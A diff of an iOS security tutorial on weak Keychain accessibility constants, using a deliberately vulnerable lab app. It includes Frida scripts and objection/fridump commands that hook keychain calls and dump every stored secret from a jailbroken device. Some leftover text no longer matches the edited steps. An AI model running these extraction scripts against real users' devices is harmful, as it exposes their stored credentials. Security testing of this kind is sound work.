@@ -11,7 +11,7 @@ render_with_liquid: false
 The iOS Keychain is the right place to store secrets. The detail that determines whether your secrets are actually protected: which `kSecAttrAccessible` constant the developer chose. iOS provides six levels of accessibility, and only the strictest one survives device theft and jailbreak-based data extraction. The most permissive, `kSecAttrAccessibleAlways`, survives every lock state and is readable from a jailbroken device without the user's passcode.
 
 <aside class="lab">
-  <p><strong>Vulnerable demo</strong> · <a href="https://github.com/nirajkharel/VulnLabApp">VulnLabApp</a></p>
+  <p><strong>Vulnerable demo</strong> · <a href="https://github.com/nirajkharel/VulnLabAppiOS">VulnLabAppiOS</a></p>
   <ul>
     <li><code>ios/VulnLabApp/ViewControllers/LoginViewController.swift</code></li>
   </ul>
@@ -53,33 +53,36 @@ The service identifier is the bundle ID (`com.vulnlab.iosapp`), the account is `
 
 <br>**Identifying the bug**
 
-Pull the IPA, decompile, and grep:
-
-```bash
-strings Payload/VulnLabApp.app/VulnLabApp | grep kSecAttrAccessible
-```
-
-Each match shows the accessibility level the binary uses. `kSecAttrAccessibleAlways` is the worst case.
+Pull the IPA, decompile, and use a decompiler (Hopper, Ghidra) insead. Both resolve imported Security framework symbols and surface the constant by name in the decompiled pseudocode. Search for kSecAttrAccessibleAlways in the output - it appears inside the keychain query dictionary construction.
 
 For Swift code, the constants are mapped to Foundation strings (`kSecAttrAccessibleAlways` is the string `"dku"`). The strings command catches both.
 
 At runtime, hook `SecItemAdd` and `SecItemUpdate`:
 
 ```javascript
-const SecItemAdd = Module.findExportByName('Security', 'SecItemAdd');
+// Module.findExportByName() static form removed in Frida 17
+var SecItemAdd = null;
+Process.enumerateModules().forEach(function (m) {
+  if (!SecItemAdd) SecItemAdd = m.findExportByName('SecItemAdd');
+});
+
 Interceptor.attach(SecItemAdd, {
   onEnter: function (args) {
-    const dict = new ObjC.Object(args[0]);
-    console.log('[SecItemAdd] ' + dict);
+    var dict = new ObjC.Object(args[0]);
+    // pdmn is the raw key for kSecAttrAccessible
+    var pdmn = dict.objectForKey_(ObjC.classes.NSString.stringWithString_('pdmn'));
+    console.log('[SecItemAdd] kSecAttrAccessible = ' + pdmn);
+    console.log(dict.description());
   }
 });
 ```
+<img alt="LoginViewController.swift - storeApiKeyWithAlwaysAccessible with kSecAttrAccessibleAlways (highlight 1) and SecItemAdd call (highlight 2) annotated" loading="lazy" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/ios-keychain-frida.png">
 
 The trace shows every keychain insert with its full attribute dictionary, including the accessibility level.
 
 <br>**Extracting keychain items from a jailbroken device**
 
-If you have access to the test device (or in the case of a stolen device with JB), dump every keychain item the app stored:
+If you have access to the test device with JB, dump every keychain item the app stored:
 
 ```bash
 # Via objection
@@ -90,25 +93,44 @@ ios keychain dump
 fridump --target-process com.vulnlab.iosapp --keychain
 ```
 
+<img alt="LoginViewController.swift - storeApiKeyWithAlwaysAccessible with kSecAttrAccessibleAlways (highlight 1) and SecItemAdd call (highlight 2) annotated" loading="lazy" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/ios-keychain-2.png">
+
 The output lists every keychain item the app stored. Items with `kSecAttrAccessibleAlways` are readable. Items with `WhenPasscodeSetThisDeviceOnly` may not be, depending on whether the device has a passcode set and the dump method.
 
 Either tool surfaces the same data, alias, account, service, accessibility level, and `v_Data` (the actual secret payload, returned base64-encoded; decode for the plaintext). The keychain query under the hood is `SecItemCopyMatching` with `kSecMatchLimitAll`. You can also call it yourself from Frida if you prefer manual control:
 
 ```javascript
-const SecItemCopyMatching = new NativeFunction(
-    Module.findExportByName('Security', 'SecItemCopyMatching'),
-    'int', ['pointer', 'pointer']);
+// frida -U -f com.vulnlab.iosapp
+ObjC.schedule(ObjC.mainQueue, function () {
+  var addr = null;
+  Process.enumerateModules().forEach(function (m) {
+    if (!addr) addr = m.findExportByName('SecItemCopyMatching');
+  });
+  var SecItemCopyMatching = new NativeFunction(addr, 'int', ['pointer', 'pointer']);
 
-const query = ObjC.classes.NSMutableDictionary.dictionary();
-query.setObject_forKey_(ObjC.classes.NSString.stringWithString_('genp'), 'class');
-query.setObject_forKey_(ObjC.classes.NSNumber.numberWithBool_(true), 'r_Data');
-query.setObject_forKey_(ObjC.classes.NSNumber.numberWithBool_(true), 'r_Attributes');
-query.setObject_forKey_(ObjC.classes.NSString.stringWithString_('m_LimitAll'), 'm_Limit');
+  var query = ObjC.classes.NSMutableDictionary.dictionary();
+  query.setObject_forKey_(ObjC.classes.NSString.stringWithString_('genp'),
+                          ObjC.classes.NSString.stringWithString_('class'));
+  query.setObject_forKey_(ObjC.classes.NSNumber.numberWithBool_(true),
+                          ObjC.classes.NSString.stringWithString_('r_Data'));
+  query.setObject_forKey_(ObjC.classes.NSNumber.numberWithBool_(true),
+                          ObjC.classes.NSString.stringWithString_('r_Attributes'));
+  query.setObject_forKey_(ObjC.classes.NSString.stringWithString_('m_LimitAll'),
+                          ObjC.classes.NSString.stringWithString_('m_Limit'));
 
-const resultPtr = Memory.alloc(Process.pointerSize);
-const status = SecItemCopyMatching(query, resultPtr);
-console.log('status=' + status, 'items=' + new ObjC.Object(Memory.readPointer(resultPtr)));
+  var resultPtr = Memory.alloc(Process.pointerSize);
+  resultPtr.writePointer(ptr(0));
+  var status = SecItemCopyMatching(query, resultPtr);
+  if (status === 0) {
+    console.log(new ObjC.Object(resultPtr.readPointer()).description());
+  } else {
+    console.log('status: ' + status);
+  }
+});
+
 ```
+
+<img alt="LoginViewController.swift - storeApiKeyWithAlwaysAccessible with kSecAttrAccessibleAlways (highlight 1) and SecItemAdd call (highlight 2) annotated" loading="lazy" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/ios-keychain-3.png">
 
 This dumps every generic-password keychain item the app has stored, including the accessibility level on each.
 
